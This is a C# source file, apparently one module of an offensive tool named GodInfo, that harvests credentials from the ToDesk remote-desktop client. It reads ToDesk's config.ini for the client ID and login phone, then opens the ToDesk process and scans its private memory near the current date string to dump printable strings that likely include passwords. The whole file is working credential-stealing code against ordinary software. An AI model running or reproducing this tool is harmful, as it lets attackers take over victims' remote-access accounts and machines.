using GodInfo.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace GodInfo.Commands
{
    public class ToDeskCredCommand : ICommand
    {
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_PRIVATE = 0x20000;
        private const uint PAGE_READWRITE = 0x04;
        private const int MATCH_BUFFER_SIZE = 1024;
        private const int MIN_STRING_LENGTH = 5;
        private static readonly string ProcessName = "ToDesk";
        private static readonly string DefaultProcessPath = @"C:\Program Files\ToDesk\ToDesk.exe";
        private static readonly string TempPassPattern = @"\b[a-zA-Z0-9]{8,}\b";
        private static readonly string SafePassPattern = @"\b(?=.*[a-zA-Z])(?=.*\d)(?=.*[^a-zA-Z0-9]).{8,}\b";

        [StructLayout(LayoutKind.Sequential)]
        struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting credentials from ToDesk process.");
            GetToDeskCred();
        }

        public static void GetToDeskCred()
        {
            Logger.TaskHeader("Hunting ToDesk", 1);
            
            // 获取所有ToDesk进程
            Process[] processes = Process.GetProcessesByName(ProcessName);
            Process process = null;
            
            // 筛选进程，排除SessionId为0的系统进程
            foreach (var proc in processes)
            {
                if (proc.SessionId != 0)
                {
                    process = proc;
                    break;
                }
            }
            
            if (process == null)
            {
                Logger.WriteLine($"[-] {ProcessName} is not running in user session.");
                return;
            }

            Logger.WriteLine($"[*] Hunt process: {ProcessName}.exe PID: {process.Id}");

            string processPath = string.Empty;
            try
            {
                processPath = process.MainModule.FileName;
                Logger.WriteLine($"[*] Process path: {processPath}");
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Unable to get process path: {ex.Message}");
                Logger.WriteLine($"[*] Using default process path: {DefaultProcessPath}");
                processPath = DefaultProcessPath;
            }

            // 尝试读取config.ini（可选）
            string processDirectory = Path.GetDirectoryName(processPath);
            string configPath = Path.Combine(processDirectory, "config.ini");

            if (File.Exists(configPath))
            {
                Logger.WriteLine($"[*] config.ini file path: {configPath}");
                try
                {
                    var lines = File.ReadAllLines(configPath);
                    foreach (var line in lines)
                    {
                        var trimmedLine = line.Trim();
                        if (trimmedLine.StartsWith("clientId=", StringComparison.OrdinalIgnoreCase))
                        {
                            Logger.WriteLine($"[+] ClientId: {trimmedLine.Substring("clientId=".Length)}");
                        }
                        else if (trimmedLine.StartsWith("Version=", StringComparison.OrdinalIgnoreCase))
                        {
                            Logger.WriteLine($"[+] Version: {trimmedLine.Substring("Version=".Length)}");
                        }
                        else if (trimmedLine.StartsWith("LoginPhone=", StringComparison.OrdinalIgnoreCase))
                        {
                            Logger.WriteLine($"[+] LoginPhone: {trimmedLine.Substring("LoginPhone=".Length)}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Logger.WriteLine($"[-] Error reading config.ini: {ex.Message}");
                }
            }
            else
            {
                Logger.WriteLine($"[*] config.ini not found, continuing with memory scan only");
            }

            // 开始内存扫描（无论是否有config.ini都执行）
            IntPtr processHandle = NTAPI.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, process.Id);
            if (processHandle == IntPtr.Zero)
            {
                Logger.WriteLine("[-] Failed to open process with NTAPI. Trying alternative method...");
                
                try
                {
                    // 尝试使用另一种方法打开进程 - 使用正确的Win32 API方法重载
                    processHandle = Win32.OpenProcess((uint)(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), false, (uint)process.Id);
                    if (processHandle == IntPtr.Zero)
                    {
                        // 尝试使用更低权限
                        processHandle = Win32.OpenProcess((uint)PROCESS_VM_READ, false, (uint)process.Id);
                        if (processHandle == IntPtr.Zero)
                        {
                            Logger.WriteLine("[-] All process open methods failed. This may be due to insufficient permissions.");
                            Logger.WriteLine("[*] Try running with elevated permissions or checking process integrity level.");
                            return;
                        }
                    }
                    Logger.WriteLine("[+] Successfully opened process with Win32 API.");
                }
                catch (Exception ex)
                {
                    Logger.WriteLine($"[-] Exception when trying to open process: {ex.Message}");
                    return;
                }
            }

            string currentDate = DateTime.Now.ToString("yyyyMMdd");
            byte[] todeskDateBytes = Encoding.ASCII.GetBytes(currentDate);

            Logger.WriteLine($"[*] Using current date ({currentDate}) as memory scan pattern");
            Logger.WriteLine("[*] Starting memory scan...");

            bool found = false;
            long foundPosition = 0;

            try
            {
                IntPtr address = IntPtr.Zero;
                while (!found)
                {
                    NTAPI.MEMORY_BASIC_INFORMATION mbi;
                    IntPtr result = NTAPI.VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));

                    if (result == IntPtr.Zero)
                    {
                        break;
                    }

                    if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE)
                    {
                        long regionSizeLong = mbi.RegionSize.ToInt64();
                        if (regionSizeLong > int.MaxValue)
                        {
                            Logger.WriteLine("[*] Region size too large, skipping.");
                            address = new IntPtr(mbi.BaseAddress.ToInt64() + regionSizeLong);
                            continue;
                        }

                        try
                        {
                            byte[] buffer = new byte[regionSizeLong];
                            if (NTAPI.ReadProcessMemory(processHandle, mbi.BaseAddress, buffer, (int)regionSizeLong, out int bytesRead))
                            {
                                if(bytesRead > 0)
                                {
                                    int sequenceIndex = NTAPI.FindBytes(buffer, todeskDateBytes);
                                    if (sequenceIndex != -1)
                                    {
                                        foundPosition = mbi.BaseAddress.ToInt64() + sequenceIndex;
                                        found = true;

                                        // 确定合理的缓冲区大小
                                        long flagStart = Math.Max(0, foundPosition - MATCH_BUFFER_SIZE);
                                        long flagEnd = Math.Min(mbi.BaseAddress.ToInt64() + regionSizeLong, 
                                                             foundPosition + todeskDateBytes.Length + 200);

                                        int flagSize = (int)(flagEnd - flagStart);
                                        byte[] flagBuffer = new byte[flagSize];
                                        
                                        Logger.WriteLine($"[+] Found pattern at address 0x{foundPosition:X}, extracting data...");
                                        
                                        if (NTAPI.ReadProcessMemory(processHandle, new IntPtr(flagStart), flagBuffer, flagSize, out bytesRead))
                                        {
                                            // 提取ASCII字符串
                                            List<string> allFoundStrings = ExtractStrings(flagBuffer);

                                            if (allFoundStrings.Count > 0)
                                            {
                                                Logger.WriteLine($"[*] Found {allFoundStrings.Count} printable ASCII strings:");
                                                foreach (string str in allFoundStrings)
                                                {
                                                    Logger.WriteLine($"[+] {str}");
                                                }
                                            }
                                            else
                                            {
                                                Logger.WriteLine("[-] No valid strings found in the memory region.");
                                            }
                                        }
                                        else
                                        {
                                            Logger.WriteLine("[-] Failed to read memory at pattern location.");
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.WriteLine($"[-] Error scanning memory region: {ex.Message}");
                        }
                    }

                    address = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                }

                if (!found)
                {
                    Logger.WriteLine("[-] Target date pattern not found in process memory.");
                }
            }
            finally
            {
                NTAPI.CloseHandle(processHandle);
            }
        }
        
        // 辅助方法，从字节数组中提取ASCII字符串
        private static List<string> ExtractStrings(byte[] buffer)
        {
            var strings = new List<string>();
            int start = -1;
            
            for (int i = 0; i < buffer.Length; i++)
            {
                if (buffer[i] >= 32 && buffer[i] <= 126) // 可打印ASCII字符范围
                {
                    if (start == -1)
                    {
                        start = i;
                    }
                }
                else if (start != -1)
                {
                    int length = i - start;
                    if (length >= MIN_STRING_LENGTH)
                    {
                        byte[] stringBytes = new byte[length];
                        Array.Copy(buffer, start, stringBytes, 0, length);
                        string foundString = Encoding.ASCII.GetString(stringBytes);
                        strings.Add(foundString);
                    }
                    start = -1;
                }
            }
            
            // 处理最后一个字符串（如果缓冲区结尾是字符串的一部分）
            if (start != -1 && buffer.Length - start >= MIN_STRING_LENGTH)
            {
                int length = buffer.Length - start;
                byte[] stringBytes = new byte[length];
                Array.Copy(buffer, start, stringBytes, 0, length);
                string foundString = Encoding.ASCII.GetString(stringBytes);
                strings.Add(foundString);
            }
            
            return strings;
        }
    }
}